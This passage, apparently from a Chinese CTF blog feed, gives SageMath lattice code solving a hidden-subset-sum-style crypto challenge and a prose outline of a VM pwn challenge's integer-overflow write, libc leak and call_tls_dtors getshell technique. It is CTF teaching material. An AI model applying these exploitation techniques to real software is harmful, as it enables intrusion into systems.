class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kernelLLL</span>(<span class="params">M</span>):</span></span><br><span class="line">    n = M.nrows()</span><br><span class="line">    m = M.ncols()</span><br><span class="line">    <span class="keyword">if</span> m &lt; <span class="number">2</span> * n:</span><br><span class="line">        <span class="keyword">return</span> M.right_kernel().matrix()</span><br><span class="line">    K = <span class="number">2</span> ^ (m // <span class="number">2</span>) * M.height()</span><br><span class="line">    MB = Matrix(ZZ, m + n, m)</span><br><span class="line">    MB[:n] = K * M</span><br><span class="line">    MB[n:] = identity_matrix(m)</span><br><span class="line">    MB2 = MB.T.LLL().T</span><br><span class="line">    <span class="keyword">assert</span> MB2[:n, : m - n] == <span class="number">0</span></span><br><span class="line">    Ke = MB2[n:, : m - n].T</span><br><span class="line">    <span class="keyword">return</span> Ke</span><br></pre></td></tr></table></figure><p>那么至此我们就弄出了$\overline{\mathcal{L_x}}$ 的一组约减基，也就构造出了$\overline{\mathcal{L_x}}$ </p><h4 id="step-2-BKZ"><a href="#step-2-BKZ" class="headerlink" title="step 2:BKZ"></a>step 2:BKZ</h4><p>前面说到弄出了$\overline{\mathcal{L_x}}$ 的一组LLL约减基，但是由于LLL近似因子的原因,所得到的基可能会比$\vec{x_i}$大很多($\vec{x_i}\in\{0,1\}^m$)，所以需要进一步用BKZ算法来缩小近似因子，然后进而恢复出$\vec{x_i}$ 。这一块其实挺简单的，就对得到的格$\overline{\mathcal{L_x}}$不停加码进行BKZ操作就行了，直到得到的每个分量都$\in\{0,1\}$ </p><p>因为前面说到$\mathcal{L}$为$\overline{\mathcal{L}}$的一个满秩子格。所以对$\overline{\mathcal{L}}$进行格约简操作其实是能包括$\mathcal{L}$ ,得到后者的约简基的。不一定要求格是完全的</p><h3 id="强网杯中的TASK"><a href="#强网杯中的TASK" class="headerlink" title="强网杯中的TASK"></a>强网杯中的TASK</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line">n = <span class="number">75</span></span><br><span class="line">m = <span class="number">150</span></span><br><span class="line">r = <span class="number">10</span></span><br><span class="line">N = <span class="number">126633165554229521438977290762059361297987250739820462036000284719563379254544315991201997343356439034674007770120263341747898897565056619503383631412169301973302667340133958109</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">n, m, r, N</span>):</span></span><br><span class="line">    t1 = [ZZ.random_element(<span class="number">-2</span>^<span class="number">15</span>, <span class="number">2</span>^<span class="number">15</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> range(n*m)]</span><br><span class="line">    t2 = [ZZ.random_element(N) <span class="keyword">for</span> _ <span class="keyword">in</span> range(r*n)]</span><br><span class="line">    B = matrix(ZZ, n, m, t1)</span><br><span class="line">    L = IntegerLattice(B)</span><br><span class="line">    A = matrix(ZZ, r, n, t2)</span><br><span class="line">    print(B)</span><br><span class="line">    C = (A * B) % N</span><br><span class="line">    <span class="keyword">return</span> L, C</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s + (<span class="number">16</span> - len(s) % <span class="number">16</span>) * <span class="string">b&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">output = open(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"><span class="comment">#token = input(&quot;team token:&quot;).strip().encode()</span></span><br><span class="line">L, C = gen(n, m, r, N)</span><br><span class="line">print(C,file = output)</span><br><span class="line">key = sha256(str(L.reduced_basis[<span class="number">0</span>]).encode()).digest()</span><br><span class="line">aes = AES.new(key, AES.MODE_ECB)</span><br><span class="line">ct = b64encode(aes.encrypt(pad(flag))).decode()</span><br><span class="line">print(ct,file = output)</span><br></pre></td></tr></table></figure><p>回顾刚刚关于HSSP问题的介绍，那个是长这样子的</p><script type="math/tex; mode=display">\vec{h} \equiv \alpha_1\vec{x_1}+\alpha_2\vec{x_2}+\dots+\alpha_n\vec{x_n} (\mod q)</script><p>是只给一个向量，一个模数，并且每个$\vec{x_i}$的范围都是$\{0,1\}^m$ ,而其实这个TASK中的问题有所区别，它给的是</p><script type="math/tex; mode=display">C\equiv A*B \mod N</script><p>并且每个$B$中的元素都在$(-2^{15},2^{15})$ 之间，是比$\vec{x_i}$的范围要大得多，但是也属于较小数的范畴。将矩阵用向量来表示，转化成一个类似HSSP的问题，其实就是相当于给定了</p><script type="math/tex; mode=display">\vec{h_i} \equiv \alpha_{i,1}\vec{x_1}+\alpha_{i,2}\vec{x_2}+\dots+\alpha_{i,n}\vec{x_n} (\mod q)</script><p> 其中$i \in \{1,2,\dots,r\},\vec{x_i}\in\{-2^{15},\dots,2^{15}\}^m$ 可以发现区别是向量模长变大了，同时给了多组数据。我们要求出矩阵$B$构成的格的约简基的第一行。</p><p>一开始我想的是只使用一组数据，同时减少BKZ的次数以控制出来的约简基不至于太小，但是不太成功，就算只LLL一下出来的数据也特别小，根本不满足范围要求</p><p>这里我们需要对HSSP问题扩展一下，那里我们构造的是一个$\mathcal{L_0}$ ,满足模$q$正交，也即</p><script type="math/tex; mode=display">\mathcal{L}_0 = \{\vec{u} \in \mathbb{Z}^m|<\vec{u},\vec{h}>\equiv 0(\mod q)\}</script><p>然后我们知道它LLL的结果所得到的前$m-n$个向量$\vec{u_1},\dots,\vec{u}_{m-n}$ 是$\mathcal{L}_x^{\perp}$的一组生成基，随即用<code>kernelLLL</code>对其操作得到$\overline{\mathcal{L_x}}$，由于$\mathcal{L_x}$是$\overline{\mathcal{L_x}}$的一个满秩子格，所以对后者不断进行BKZ就行了</p><p>这里我们也需要构造一个模$p$正交的格，但是由于给了多组数据，所以我们扩展一下，类似的，相当于需要构造一个$\mathcal{L_0’}$,满足如下表达式</p><script type="math/tex; mode=display">\mathcal{L}_0 = \{\vec{u} \in \mathbb{Z}^m|\forall i\in\{1,\dots,r\},<\vec{u},\vec{h_i}>\equiv 0(\mod q)\}</script><p>将$h_i$向量构成的矩阵记作$C$ ，相当于我们需要找到一个$B’$ ，满足</p><script type="math/tex; mode=display">B'*C^{T}\equiv0(\mod q)</script><p>在HSSP问题中，我们采取的方法是构造，这里我没试过能否构造，先贴一下Nu1L的思路分析一下(侵删)</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">A = matrix(ZZ,m+r,m+r)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(m):</span><br><span class="line">A[i,i] = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(r):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(m):</span><br><span class="line">A[j,i+m] = C[i,j]&lt;&lt;<span class="number">200</span></span><br><span class="line">A[i+m,i+m] = N&lt;&lt;<span class="number">200</span></span><br><span class="line">ans = A.LLL()</span><br><span class="line">B = matrix(ZZ,n,m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line"><span class="keyword">assert</span> list(ans[i][m:]) == [<span class="number">0</span>]*r</span><br><span class="line">B[i] = ans[i][:m]</span><br></pre></td></tr></table></figure><p>这里后来我测试的时候发现是满足上面那个关系式的，测试的主要代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  data = f.readlines()</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">    data[i] = data[i].replace(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> data[i]:</span><br><span class="line">      <span class="keyword">if</span> x != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        tmp.append(int(x))</span><br><span class="line">    data[i] = tmp</span><br><span class="line">C = matrix(ZZ, data)</span><br><span class="line"></span><br><span class="line">B = matrix(ZZ,n,m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">  <span class="keyword">assert</span> list(ans[i][m:]) == [<span class="number">0</span>]*r</span><br><span class="line">  B[i] = ans[i][:m]</span><br><span class="line">print(<span class="string">&quot;may be (B*C^T) mod N = 0&quot;</span>)</span><br><span class="line">print((B*C.transpose())%N)</span><br><span class="line">print(<span class="string">&quot;=&quot;</span>*<span class="number">150</span>)</span><br></pre></td></tr></table></figure><p>测试的结果如下图，确实是满足正交的一个矩阵</p><p><img src="https://s2.loli.net/2022/09/30/J4Za7moPY5Vzu9E.png" alt="QQ图片20220930151217.png"></p><p>我个人的理解是这样的,改写表达式为</p><script type="math/tex; mode=display">C\equiv A*B \mod N \rightarrow C =A*B-N*P \rightarrow C^{T} = B^{T}*A^{T}-N*P^{T}</script><p>其中$P$是一个随机矩阵。当构造如下格</p><script type="math/tex; mode=display">A =\left[\begin{array}{c:c}\textbf{I}_m&C^{T}*2^{200}\\ \hdashline\textbf{0}&N*\textbf{I}_r*2^{200}\end{array}\right]</script><p>对其进行LLL的时候，相当于我们在寻求一个矩阵$S$，使得$S*A$得到短基，这个矩阵大致刻画一下是这样的</p><script type="math/tex; mode=display">S =\left[\begin{array}{c:c}B'&K\\ \hdashline\textbf{?}&\textbf{?}\end{array}\right]</script><p>我们只关注上半行的右半边，由于加了一个权重2^200，我们所以右半r边大概率是0，否则模长至少为2^200这个量级(从右半边而言)</p><p>那么其实就相当于满足了这个东西</p><script type="math/tex; mode=display">B'*C^{T}+N*K= 0</script><p>两边模去$N$,显然有</p><script type="math/tex; mode=display">B'*C^{T}\equiv0(\mod N)</script><p>模仿HSSP的思路，得到了$B’$ 之后，我们对其进行<code>kernelLLL</code>得到$\overline{\mathcal{L_x}}$ 也就是我们原始的B的一组LLL约简基，但是这里有个问题是似乎比例因子不太对，得到的元素都是并不在$\{-2^{15},\dots,2^{15}\}^m$ 范围，而是略大一点，所以用BKZ进一步约简即可</p><p>当然我们也可以不用<code>kernelLLL</code> ，而是直接<code>right_kernel().basis()</code> ，因为我们之前说过得到的是$\mathcal{L}_x^{\perp}$的一组生成基，那么对其再取个右核其实就一点类似于求正交格的过程(事实上<code>kernelLLL</code>有一步判断$m&lt;2n$的 时候也就是这样做的)。本地测试了一下，无论是<code>kernelLLL</code>zai再BKZ还是<code>right_kernel().basis()</code>再BKZ，都能得到正确的答案</p><p>生成数据的测试代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> sage.modules.free_module_integer <span class="keyword">import</span> IntegerLattice</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> signal</span><br><span class="line"></span><br><span class="line">n = <span class="number">75</span></span><br><span class="line">m = <span class="number">150</span></span><br><span class="line">r = <span class="number">10</span></span><br><span class="line">N = <span class="number">126633165554229521438977290762059361297987250739820462036000284719563379254544315991201997343356439034674007770120263341747898897565056619503383631412169301973302667340133958109</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gen</span>(<span class="params">n, m, r, N</span>):</span></span><br><span class="line">    t1 = [ZZ.random_element(<span class="number">-2</span>^<span class="number">15</span>, <span class="number">2</span>^<span class="number">15</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> range(n*m)]</span><br><span class="line">    t2 = [ZZ.random_element(N) <span class="keyword">for</span> _ <span class="keyword">in</span> range(r*n)]</span><br><span class="line">    B = matrix(ZZ, n, m, t1)</span><br><span class="line">    L = IntegerLattice(B)</span><br><span class="line">    A = matrix(ZZ, r, n, t2)</span><br><span class="line">    save(B,<span class="string">&#x27;orignal_b.sobj&#x27;</span>)</span><br><span class="line">    C = (A * B) % N</span><br><span class="line">    <span class="keyword">return</span> L,B, C</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="keyword">return</span> s + (<span class="number">16</span> - len(s) % <span class="number">16</span>) * <span class="string">b&quot;\x00&quot;</span></span><br><span class="line"></span><br><span class="line">output = open(<span class="string">&quot;output.txt&quot;</span>,<span class="string">&quot;w&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#token = input(&quot;team token:&quot;).strip().encode()</span></span><br><span class="line">L, B,C = gen(n, m, r, N)</span><br><span class="line">print(C,file = output)</span><br><span class="line">save(C,<span class="string">&quot;output.sobj&quot;</span>)</span><br><span class="line">save(L,<span class="string">&quot;L.sobj&quot;</span>)</span><br><span class="line">LL = load(<span class="string">&quot;L.sobj&quot;</span>)</span><br><span class="line">print(LL==L)</span><br><span class="line">CC = load(<span class="string">&quot;output.sobj&quot;</span>)</span><br><span class="line">print(CC==C)</span><br><span class="line">OB = load(<span class="string">&quot;orignal_b.sobj&quot;</span>)</span><br><span class="line">print(OB==B)</span><br></pre></td></tr></table></figure><p>进行测试的代码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">n = <span class="number">75</span></span><br><span class="line">m = <span class="number">150</span></span><br><span class="line">r = <span class="number">10</span></span><br><span class="line">N =<span class="number">126633165554229521438977290762059361297987250739820462036000284719563379254544315991201997343356439034674007770120263341747898897565056619503383631412169301973302667340133958109</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">kernelLLL</span>(<span class="params">M</span>):</span></span><br><span class="line">    n = M.nrows()</span><br><span class="line">    m = M.ncols()</span><br><span class="line">    <span class="keyword">if</span> m &lt; <span class="number">2</span> * n:</span><br><span class="line">        <span class="keyword">return</span> M.right_kernel().matrix()</span><br><span class="line">    K = <span class="number">2</span> ^ (m // <span class="number">2</span>) * M.height()</span><br><span class="line">    MB = Matrix(ZZ, m + n, m)</span><br><span class="line">    MB[:n] = K * M</span><br><span class="line">    MB[n:] = identity_matrix(m)</span><br><span class="line">    MB2 = MB.T.LLL().T</span><br><span class="line">    <span class="keyword">assert</span> MB2[:n, : m - n] == <span class="number">0</span></span><br><span class="line">    Ke = MB2[n:, : m - n].T</span><br><span class="line">    <span class="keyword">return</span> Ke</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  data = f.readlines()</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> range(len(data)):</span><br><span class="line">    data[i] = data[i].replace(<span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;&#x27;</span>).split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">    tmp = []</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> data[i]:</span><br><span class="line">      <span class="keyword">if</span> x != <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        tmp.append(int(x))</span><br><span class="line">    data[i] = tmp</span><br><span class="line">C = matrix(ZZ, data)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">CC = load(&quot;output.sobj&quot;)</span></span><br><span class="line"><span class="string">print(C==CC)</span></span><br><span class="line"><span class="string">A = matrix(ZZ,m+r,m+r)</span></span><br><span class="line"><span class="string">for i in range(m):</span></span><br><span class="line"><span class="string">  A[i,i] = 1</span></span><br><span class="line"><span class="string">for i in range(r):</span></span><br><span class="line"><span class="string">  for j in range(m):</span></span><br><span class="line"><span class="string">    A[j,i+m] = C[i,j]&lt;&lt;200</span></span><br><span class="line"><span class="string">  A[i+m,i+m] = N&lt;&lt;200</span></span><br><span class="line"><span class="string">print(&quot;start LLL&quot;)</span></span><br><span class="line"><span class="string">ans = A.LLL()</span></span><br><span class="line"><span class="string">print(&quot;END LLL&quot;)</span></span><br><span class="line"><span class="string">save(ans,&quot;ALLL.sobj&quot;)</span></span><br><span class="line"><span class="string">B = matrix(ZZ,n,m)</span></span><br><span class="line"><span class="string">for i in range(n):</span></span><br><span class="line"><span class="string">  assert list(ans[i][m:]) == [0]*r</span></span><br><span class="line"><span class="string">  B[i] = ans[i][:m]</span></span><br><span class="line"><span class="string">ans = B.right_kernel().basis()</span></span><br><span class="line"><span class="string">save(ans,&quot;ans.sobj&quot;)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">ans = load(<span class="string">&quot;ALLL.sobj&quot;</span>)</span><br><span class="line"></span><br><span class="line">B = matrix(ZZ,n,m)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">  <span class="keyword">assert</span> list(ans[i][m:]) == [<span class="number">0</span>]*r</span><br><span class="line">  B[i] = ans[i][:m]</span><br><span class="line">print(<span class="string">&quot;may be (B*C^T) mod N = 0&quot;</span>)</span><br><span class="line">print((B*C.transpose())%N)</span><br><span class="line">print(<span class="string">&quot;=&quot;</span>*<span class="number">150</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ke = kernelLLL(B)</span><br><span class="line">print(<span class="string">&quot;This is the kernelLLL of B&quot;</span>)</span><br><span class="line">print(ke[<span class="number">0</span>])</span><br><span class="line">print(<span class="string">&quot;=&quot;</span>*<span class="number">150</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;This is BKZ(block_size=12) of the kernelLLL of B&quot;</span>)</span><br><span class="line">print(kernelLLL(B).BKZ(block_size=<span class="number">12</span>)[<span class="number">0</span>])</span><br><span class="line">print(<span class="string">&quot;=&quot;</span>*<span class="number">150</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;This is LLLof the kernelLLL of B&quot;</span>)</span><br><span class="line">print(kernelLLL(B).LLL()[<span class="number">0</span>])</span><br><span class="line">print(<span class="string">&quot;=&quot;</span>*<span class="number">150</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;This is the BKZ of right_kernel basis of B&quot;</span>)</span><br><span class="line">ans = load(<span class="string">&quot;ans.sobj&quot;</span>)</span><br><span class="line">D = matrix(ZZ,ans)</span><br><span class="line">res = D.BKZ(block_size=<span class="number">12</span>)[<span class="number">0</span>]</span><br><span class="line">print(res)</span><br><span class="line">print(<span class="string">&quot;=&quot;</span>*<span class="number">150</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;This is the LLL of right_kernel basis of B&quot;</span>)</span><br><span class="line">res = D.LLL()[<span class="number">0</span>]</span><br><span class="line">print(res)</span><br><span class="line">print(<span class="string">&quot;=&quot;</span>*<span class="number">150</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">OB = load(<span class="string">&quot;orignal_b.sobj&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;This is the answer we search for&quot;</span>)</span><br><span class="line">print(OB.LLL()[<span class="number">0</span>])</span><br><span class="line">print(<span class="string">&quot;=&quot;</span>*<span class="number">150</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以观察<code>kernelLLL</code>的LLL以及BKZ结果，以及直接<code>right_kernel().basis()</code>的LLL以及BKZ结果，和我们想要的正确答案之间的比对，截图如下</p><p><img src="https://s2.loli.net/2022/09/30/HMpo1QwCjcqEBWP.png" alt="测试"> </p><h2 id="残余问题"><a href="#残余问题" class="headerlink" title="残余问题"></a>残余问题</h2><p>我们是通过LLL求得$\mathcal{L_0}$ 的，而不是论文当中的构造方法，能否通过构造来得到$\mathcal{L_0}$ </p><p>回头有空再研究一下吧(🕊)</p><p>这个只是N-S算法的一个扩展，好像论文里面采用的是统计的方法来得到的，查到的还有利用傅里叶变换来求解的。不过似乎都挺复杂的</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="[Provably Solving the Hidden Subset Sum Problem via Statistical Learning (iacr.org">Provably Solving the Hidden Subset Sum Problem via Statistical Learning</a>](<a href="https://eprint.iacr.org/2021/1007">https://eprint.iacr.org/2021/1007</a>)) </p><h1 id="TCTF-0CTF-2022"><a href="#TCTF-0CTF-2022" class="headerlink" title="TCTF/0CTF 2022"></a>TCTF/0CTF 2022</h1><h2 id="ezvm"><a href="#ezvm" class="headerlink" title="ezvm"></a>ezvm</h2><p>一道虚拟机pwn题，第一次遇见。嗯。。。显然不会做，不过后来看了大佬的博客看懂了漏洞点以及利用方式。</p><p>主要是一个因为整数溢出导致的越界写</p><p><img src="https://s2.loli.net/2022/10/07/uNcymtHjgvsB7h8.png" alt="hole"></p><p>虚拟机初始化了三个内存区域:代码、内存、栈。其中代码区域和内存区域的大小是我们可以指定的，但是有相应限制，代码区域小于<code>0x200</code>,内存区域大于<code>0x200000000000000</code>的只能申请一次。而且其实可以发现内存区域并不是我们要求多少就申请多少，而是申请了<code>8*memory_size</code> ，相当于左移了三位。那么假如申请<code>0x2000000000000001</code>的内存，其实事实上申请的是<code>0x1000</code>大小的内存(因为高位左移之后溢出了)</p><p><img src="https://s2.loli.net/2022/10/07/iYdBa3pksfJOPVc.png" alt=""></p><p>在这里通过代码21就能把实现的寄存器上的值写入到内存区</p><p>还有一个注意的点就是，如果我们想<code>malloc</code>一个超过<code>0x21000</code>的内存，就会通过<code>mmap</code>来申请，这个方式申请的区域在内存上是与<code>libc</code>相邻的。</p><p>所以通过越界写就能修改<code>libc</code>中的很多东西</p><p>有了越界写之后当然我们还想泄露一下<code>libc</code>基址，但是这里其实是不能越界读的，因为仔细观察代码22发现他的限制是<code>8*mem_size/8</code>这样就相当于和溢出了的情况是一样的。</p><p>这里主要是利用了一种类似于侧信道攻击的方法。显然我们的想法是把<code>unsortedbin</code>上那个与<code>main_arena</code>相关的地址给泄露，然后就能顺理成章拿到<code>libc</code>的基址。当我们申请内存区把一个放入<code>unsortedbin</code>的堆块申请回来时，这个地址是还存在的。所以我们可以通过 操作内存的一些操作，通过逐位与，来把内存区中的字节都泄露出来，这样就把这个<code>main_arena</code>地址给搞到手了</p><p>具体的做法是利用遇到无法识别的的<code>opcode</code>就输出<code>what???</code>这个字符。先把内存区的相应字节置入寄存器0，然后把进行测试的mask(也就是1&lt;&lt;i)放入寄存器1，利用逻辑与的<code>opcode</code>进行比较，测试的结果放入到了实现的<code>result</code>寄存器,然后利用<code>opcode=16</code>这个跳转，通过跳转得到的输出是否有<code>what</code>来判断这个位到底是1还是0。</p><p>泄露出来之后，结合越界写就能进行一系列<code>FSOP</code>或者其他针对<code>exit</code>的一些攻击(因为程序中其实是显式调用了<code>exit</code>的)</p><p>这里学到一个就是利用<code>call_tls_dtors()</code>进行getshell的方法(house_of_emma利用的好像也是这个，突然想起来上次那篇博客还没更🕊,找个时间把上次那个博客更一下)。具体的原理只研究了大概。不过这个有个要求就是需要修改或者泄露<code>fs:0x30</code>这个地方的值。这个好像是是对调用的函数指针进行加密的一种安全措施。具体加密方式主要就是简单异或。<code>fs:0x30</code>这个位置其实好像是在TLS段上，位于与 libc 相邻的 ld 空间中，这个位置距离 libc 地址的偏移固定。所以我们可以选择本地起一个docker拉下来看偏移就行了</p><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近攒了挺多比赛不会做的题没复现的，感觉过了一年自己还是那么菜…还是得多写代码多测试帮助理解&lt;/p&gt;
&lt;p&gt;把这半个月打的CTF题复现一下,有些是做出来有些没做 .有意思的题我会详细整理一下&lt;/p&gt;
&lt;h1 id=&quot;BalsnCTF-2022&quot;&gt;&lt;a href=&quot;#Bals</summary>
      
    
    
    
    
    <category term="crypto" scheme="http://phot0n.com/tags/crypto/"/>
    
    <category term="ctf" scheme="http://phot0n.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>高版本的堆利用与FSOP</title>
    <link href="http://phot0n.com/2022/09/06/%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%8EFSOP/"/>
    <id>http://phot0n.com/2022/09/06/%E9%AB%98%E7%89%88%E6%9C%AC%E7%9A%84%E5%A0%86%E5%88%A9%E7%94%A8%E4%B8%8EFSOP/</id>
    <published>2022-09-06T07:57:20.000Z</published>
    <updated>2023-05-26T05:48:35.601Z</updated>
    
